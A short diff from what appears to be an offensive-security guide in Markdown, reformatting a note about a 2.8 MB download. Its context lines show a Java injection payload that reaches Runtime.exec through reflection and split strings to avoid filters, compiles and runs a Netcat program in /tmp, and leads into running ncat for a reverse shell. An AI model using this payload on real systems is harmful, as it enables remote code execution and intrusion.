@@ -423,7 +423,9 @@ Go into `/tmp`, compile java code, run java code and make it executable
 "".getClass().forName("ja"+"va.lang.Runtime").getRuntime().exec(new String[] { "/bin/bash", "-c", "cd /tmp && ja"+"vac Netcat.ja"+"va && ja"+"va Netcat && chmod +x ncat" })
 ```
 
-> **Note**: Binary is ~2.8mb in size, download may take few seconds.
+::: info Note
+Binary is ~2.8mb in size, download may take few seconds.
+:::
 
 Finally run the `ncat` to get a reverse shell:
 ```java
